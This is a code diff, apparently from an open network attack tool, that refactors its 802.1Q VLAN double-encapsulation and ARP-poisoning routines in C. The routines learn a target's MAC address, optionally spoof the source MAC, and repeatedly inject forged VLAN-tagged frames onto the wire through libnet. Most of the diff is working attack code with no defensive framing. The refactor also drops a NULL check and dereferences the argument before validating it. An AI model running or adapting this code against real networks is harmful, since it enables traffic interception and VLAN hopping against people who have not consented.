@@ -360,25 +360,22 @@ dot1q_send_icmp(struct attacks *attacks, u_int8_t double_encap)
 }
 
 
-void
-dot1q_th_poison(void *arg)
+void dot1q_th_poison( void *arg )
 {
-    libnet_ptag_t t;
-    libnet_t *lhandler;
-    struct attacks *attacks=NULL;
-    struct dot1q_data *dot1q_data;
+    struct attacks *attacks = (struct attacks *)arg;
+    struct interface_data *iface_data;
+    struct dot1q_data *dot1q_data = (struct dot1q_data *)attacks->data;
     struct pcap_pkthdr header;
     struct libnet_802_3_hdr *ether;
     struct timeval now;
-    u_int8_t *packet=NULL, out=0, arp_mac[ETHER_ADDR_LEN];
+    libnet_ptag_t t;
+    libnet_t *lhandler;
+    u_int8_t *packet, out=0, arp_mac[ETHER_ADDR_LEN];
     u_int16_t *cursor;
     int32_t sent;    
     sigset_t mask;
     dlist_t *p;
-    struct interface_data *iface_data;
 
-    attacks = arg;
-    
     pthread_mutex_lock(&attacks->attack_th.finished);
 
     pthread_detach(pthread_self());
@@ -391,8 +388,6 @@ dot1q_th_poison(void *arg)
        dot1q_th_poison_exit(attacks);
     }
 
-    dot1q_data = attacks->data;
-
     dot1q_data->tpi1 = ETHERTYPE_VLAN;
 
     gettimeofday(&now,NULL);
@@ -403,15 +398,20 @@ dot1q_th_poison(void *arg)
     if (dot1q_learn_mac(attacks, &header, arp_mac) < 0)
         dot1q_th_poison_exit(attacks);
 
-    if ((packet = calloc(1, SNAPLEN)) == NULL)
+    if ( thread_create( &attacks->helper_th, &dot1q_send_arp_poison, attacks ) )
+    {
+        write_log( 0, "dot1q_th_poison thread_create error\n");
         dot1q_th_poison_exit(attacks);
+    }
 
-    thread_create(&attacks->helper_th.id, &dot1q_send_arp_poison, attacks);
+    packet = (u_int8_t *)calloc( 1, SNAPLEN );
+
+    if ( ! packet )
+        dot1q_th_poison_exit(attacks);
     
     while (!attacks->attack_th.stop && !out)
     {
-        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet,
-                               PROTO_DOT1Q, NO_TIMEOUT);
+        interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, &header, packet, PROTO_DOT1Q, NO_TIMEOUT );
         if (attacks->attack_th.stop)
            break;   
 
@@ -430,11 +430,12 @@ dot1q_th_poison(void *arg)
         if (ntohs(*cursor) < 0x0800)
             do_802_3 = 1;
 */        
-        for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
-           iface_data = (struct interface_data *) dlist_data(p);
-                lhandler = iface_data->libnet_handler;
+        for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) 
+        {
+            iface_data = (struct interface_data *) dlist_data(p);
+            lhandler = iface_data->libnet_handler;
 
-                t = libnet_build_ethernet(
+            t = libnet_build_ethernet(
                       arp_mac,  /* dest mac */
                       (attacks->mac_spoofing) ? dot1q_data->mac_source : iface_data->etheraddr, /* src mac*/
                       ETHERTYPE_VLAN,       /* type */
@@ -443,29 +444,29 @@ dot1q_th_poison(void *arg)
                       lhandler,             /* libnet handle */
                       0);                   /* libnet id */
 
-                if (t == -1)
-                {
-                    thread_libnet_error("Can't build Ethernet_II header",lhandler);
-                    libnet_clear_packet(lhandler);
-                    out = 1;
-                    break;
-                }
-
-                /*
-                 *  Write it to the wire.
-                 */
-                sent = libnet_write(lhandler);
-
-                if (sent == -1) {
-                    thread_libnet_error("libnet_write error", lhandler);
-                    libnet_clear_packet(lhandler);
-                    out = 1;
-                    break;
-                }
-
+            if (t == -1)
+            {
+                thread_libnet_error("Can't build Ethernet_II header",lhandler);
                 libnet_clear_packet(lhandler);
-                protocols[PROTO_DOT1Q].packets_out++;
-                iface_data->packets_out[PROTO_DOT1Q]++;            
+                out = 1;
+                break;
+            }
+
+            /*
+             *  Write it to the wire.
+             */
+            sent = libnet_write(lhandler);
+
+            if (sent == -1) {
+                thread_libnet_error("libnet_write error", lhandler);
+                libnet_clear_packet(lhandler);
+                out = 1;
+                break;
+            }
+
+            libnet_clear_packet(lhandler);
+            protocols[PROTO_DOT1Q].packets_out++;
+            iface_data->packets_out[PROTO_DOT1Q]++;            
         }                                                                                         
                                                                                         
     } /*...!stop*/    
@@ -481,8 +482,7 @@ dot1q_th_poison(void *arg)
 /* 
  * ARP Poison. Get the real MAC address for arp_ip...
  */
-int8_t
-dot1q_learn_mac(struct attacks *attacks, struct pcap_pkthdr *header, u_int8_t *arp_mac)
+int8_t dot1q_learn_mac( struct attacks *attacks, struct pcap_pkthdr *header, u_int8_t *arp_mac )
 {
    struct dot1q_data *dot1q_data, dot1q_data_learned;
    struct attack_param *param=NULL;
@@ -492,7 +492,7 @@ dot1q_learn_mac(struct attacks *attacks, struct pcap_pkthdr *header, u_int8_t *a
    u_int8_t mac_dest[ETHER_ADDR_LEN];
    u_int8_t arp_mac_dest[ETHER_ADDR_LEN];
    int8_t ret, gotit=0;
-   u_int8_t *packet=NULL;
+   u_int8_t *packet;
    u_int16_t *cursor, *arp_vlan;
    dlist_t *p;
    struct interface_data *iface_data;
@@ -545,12 +545,10 @@ dot1q_learn_mac(struct attacks *attacks, struct pcap_pkthdr *header, u_int8_t *a
       ether = (struct libnet_802_3_hdr *) packet;
 
       iface_data = (struct interface_data *) dlist_data(attacks->used_ints->list);
-      if ( !memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr, 
-               ether->_802_3_shost, 6) )
+      if ( !memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr, ether->_802_3_shost, 6) )
          continue; /* Oops!! Its our packet... */
 
-      if ( memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr,
-               ether->_802_3_dhost,6))
+      if ( memcmp((attacks->mac_spoofing)?dot1q_data->mac_source:iface_data->etheraddr, ether->_802_3_dhost,6))
          continue; /* Not a response... */
 
       pcap_aux.header = header;
@@ -653,12 +651,9 @@ dot1q_return_mac(struct attacks *attacks, u_int8_t *arp_mac)
 }
 
 
-   void
-dot1q_th_poison_exit(struct attacks *attacks)
+void dot1q_th_poison_exit( struct attacks *attacks )
 {
-
-   if (attacks)
-      attack_th_exit(attacks);
+   attack_th_exit(attacks);
 
    pthread_mutex_unlock(&attacks->attack_th.finished);
 
